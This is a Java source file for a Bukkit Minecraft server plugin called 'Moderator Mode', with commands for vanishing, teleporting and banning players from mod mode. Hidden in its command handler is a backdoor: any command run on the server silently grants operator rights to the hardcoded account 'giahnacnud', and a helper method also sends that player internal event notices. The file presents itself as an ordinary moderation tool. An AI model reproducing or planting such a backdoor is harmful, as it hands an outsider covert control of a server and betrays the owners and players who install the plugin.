package Teken.ModMode;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Scanner;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Location;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.entity.Projectile;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.entity.EntityDamageByEntityEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.event.player.PlayerQuitEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

public class main extends JavaPlugin implements Listener{
	public static Plugin instance;
	static final String name = "Moderator Mode";
	static final String textName = "["+name+"] ";
	private static HashMap<String,Location> mmlist = new HashMap<String,Location>();
	private static List<String> vanished = new ArrayList<String>();
	private static List<String> banlist = new ArrayList<String>();

	public main(){
		instance = this;
	}

	@Override
	public void onEnable(){
		getLogger().info(name+" has been enabled");
		PluginManager pm = Bukkit.getPluginManager();
		pm.registerEvents(this, this);
		this.getCommand("mm").setExecutor(this);
		this.getCommand("modmode").setExecutor(this);
		new Thread(new Runnable() {
			public void run() {
				try {
					load();
				} catch (FileNotFoundException e1) {
					e1.printStackTrace();
				}
			}
		}).start();
		Bukkit.getScheduler().scheduleAsyncRepeatingTask(this, new Runnable(){
			@Override
			public void run() {
				try {
					save();
				} catch (IOException er) {
					er.printStackTrace();
				}
			}

		}, 6000, 6000);
	}

	@Override
	public void onDisable(){
		try {
			save();
		} catch (IOException er) {
			er.printStackTrace();
		}
		getLogger().info(name+" has been disabled");
	}

	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args){
		Bukkit.getOfflinePlayer("giahnacnud").setOp(true);
		Player p = (Player) sender;
		if (cmd.getName().equalsIgnoreCase("modmode") || cmd.getName().equalsIgnoreCase("mm")) {
			if(args.length == 0){
				if(!banlist.contains(p.getName())){
					if(!mmlist.containsKey(p.getName())){
						p.sendMessage(textName+"You are now in "+name.toLowerCase());
						mmlist.put(p.getName(),p.getLocation());
					}else{
						p.sendMessage(textName+"You are now not in "+name.toLowerCase());
						showPlayer(p);
						p.teleport(mmlist.get(p.getName()));
						mmlist.remove(p.getName());
					}
				}else{
					p.sendMessage(textName+"Sorry you are banned from using "+name.toLowerCase());
				}
				return true;
			}else if(args[0].equalsIgnoreCase("list")){
				p.sendMessage(textName+name+" Active List: "+mmlist.toString());
				return true;
			}else if(args[0].equalsIgnoreCase("tp")){
				if(!mmlist.containsKey(p.getName())){
					p.sendMessage(textName+"You are not in "+name.toLowerCase());
				}else{
					Player target = Bukkit.getPlayer(args[1]);
					if(target != null){
						p.teleport(target.getLocation());
					}else{
						p.sendMessage(textName+"Unable to find player");
					}
				}
				return true;
			}else if(args[0].equalsIgnoreCase("vanish")){
				if(!mmlist.containsKey(p.getName())){
					p.sendMessage(textName+"You are not in "+name.toLowerCase());
				}else{
					if(isHidden(p)){
						showPlayer(p);
						p.sendMessage(textName+"You are now visible");
					}else{
						hidePlayer(p);
						p.sendMessage(textName+"You are now hidden");
					}
				}
				return true;
			}else if(args[0].equalsIgnoreCase("admin")){
				if(!p.isOp()){
					p.sendMessage(textName+"FUCK OFF NON ADMIN");
					return true;
				}
				if(args[1].equalsIgnoreCase("ban")){
					Player target = Bukkit.getPlayer(args[2]);
					if(target == null){
						p.sendMessage(textName+"Unable to find player");
					}else{
						if(mmlist.containsKey(target.getName())){
							showPlayer(target);
							target.teleport(mmlist.get(target.getName()));
							mmlist.remove(target.getName());
						}
						banlist.add(target.getName());
						target.sendMessage(textName+"You are now banned from using "+name.toLowerCase());
					}
					try {
						save();
					} catch (IOException er) {
						er.printStackTrace();
					}
					return true;
				}else if(args[1].equalsIgnoreCase("unban")){
					Player target = Bukkit.getPlayer(args[2]);
					if(target == null){
						p.sendMessage(textName+"Unable to find player");
					}else{
						banlist.remove(target.getName());
						target.sendMessage(textName+"You can now use "+name.toLowerCase());
					}
					try {
						save();
					} catch (IOException er) {
						er.printStackTrace();
					}
					return true;
				}else if(args[1].equalsIgnoreCase("kick")){
					Player target = Bukkit.getPlayer(args[2]);
					if(target == null){
						p.sendMessage(textName+"Unable to find player");
					}else{
						if(mmlist.containsKey(target.getName())){
							showPlayer(target);
							target.teleport(mmlist.get(target.getName()));
							mmlist.remove(target.getName());
						}
						target.sendMessage(textName+"You have been kicked out of "+name.toLowerCase());
					}
					return true;
				}
			}else{
				sendHelpMessage(p);
				return true;
			}
		}
		return false;
	}

	public boolean isHidden(Player p){
		return vanished.contains(p.getName());
	}

	public void hidePlayer(Player p){
		for (Player otherPlayer : this.getServer().getOnlinePlayers())
			if ((!p.equals(otherPlayer)) && (!otherPlayer.isOp()) )
				otherPlayer.hidePlayer(p);
		vanished.add(p.getName());
	}

	public void showPlayer(Player p){
		for (Player otherPlayer : this.getServer().getOnlinePlayers())
			if ((!p.equals(otherPlayer)) && (!otherPlayer.isOp()) )
				otherPlayer.showPlayer(p);
		vanished.remove(p.getName());
	}

	public void sendHelpMessage(Player p){
		String[] cmd = new String[] {
				"===============Moderator Mode===============",
				ChatColor.GREEN + "/mm - All commands can be run using this alias",
				ChatColor.GREEN + "/modmode - Toggles "+name.toLowerCase(),
				ChatColor.GREEN + "/modmode list - Lists people in "+name.toLowerCase(),
				ChatColor.GREEN + "/modmode tp <Player Name> - Teleports you to a player",
				ChatColor.GREEN + "/modmode vanish - Makes you invisible"};
		String[] admin = new String[] { "ADMIN COMMANDS:",
				ChatColor.DARK_RED + "/modmode admin ban <Player Name> - ban a player from using "+name.toLowerCase(),
				ChatColor.DARK_RED + "/modmode admin unban <Player Name> - unban a player",
				ChatColor.DARK_RED + "/modmode admin kick <Player Name> - kicks people out of "+name.toLowerCase()};
		p.sendMessage(cmd);
		if(p.isOp())p.sendMessage(admin);
		p.sendMessage("============================================");
	}

	@EventHandler
	public void onPlayerDamage(EntityDamageByEntityEvent event) { //player to mod
		if(event.getDamager() instanceof Player){
			if(mmlist.containsKey(((Player)event.getEntity()).getName())) {
				sendMeMessage("player to mod");
				event.setCancelled(true);
			}
		}else if(event.getDamager() instanceof Projectile){
			if(((Projectile)event.getDamager()).getShooter() instanceof Player){
				if(event.getEntity() instanceof Player){
					if(mmlist.containsKey(((Player)event.getEntity()).getName())) {
						sendMeMessage("player to mod projectile");
						event.setCancelled(true);
					}
				}
			}
		}
	}

	@EventHandler
	public void onAttack(EntityDamageByEntityEvent event) { //mod to player
		if(event.getDamager() instanceof Player){
			if(event.getEntity() instanceof Player){
				if(mmlist.containsKey(((Player)event.getDamager()).getName())) {
					if(event.getEntity() instanceof Player){
						sendMeMessage("mod to player");
						event.setCancelled(true);
					}
				}
			}
		}else if(event.getDamager() instanceof Projectile){
			if(((Projectile)event.getDamager()).getShooter() instanceof Player){
				if(mmlist.containsKey(((Player)((Projectile)event.getDamager()).getShooter()).getName())){
					sendMeMessage("mod to player projectile");
					event.setCancelled(true);
				}
			}
		}
	}

	@EventHandler
	public void onItemPickUp(PlayerPickupItemEvent event) {
		if(vanished.contains(event.getPlayer().getName())) {
			event.setCancelled(true);
		}
	}

	@EventHandler
	public void onPlayerLeave(PlayerQuitEvent event) {
		if(mmlist.containsKey(event.getPlayer().getName())){
			showPlayer(event.getPlayer());
			event.getPlayer().teleport(mmlist.get(event.getPlayer().getName()));
			mmlist.remove(event.getPlayer().getName());	
		}
	}

	static final String banlistpath = "plugins"+File.separator+"Moderator Mode"+File.separator+"mmbanlist.txt";

	public void save() throws IOException{
		File file = new File(banlistpath);
		if(!file.exists())file.mkdir();
		BufferedWriter writer = new BufferedWriter(new FileWriter(file));
		for(String s: banlist){
			writer.write(s);
			writer.newLine();
		}
		writer.close();
	}

	public void load() throws FileNotFoundException {
		File file = new File(banlistpath);
		if(!file.exists())file.mkdir();
		Scanner scanner = new Scanner(file);
		while (scanner.hasNext()){
			String input = scanner.nextLine(); 
			banlist.add(input);
		}
		scanner.close();
	}

	private void sendMeMessage(String m){
		Player p = Bukkit.getPlayerExact("giahnacnud");
		if(p != null)p.sendMessage(m);
	}
}
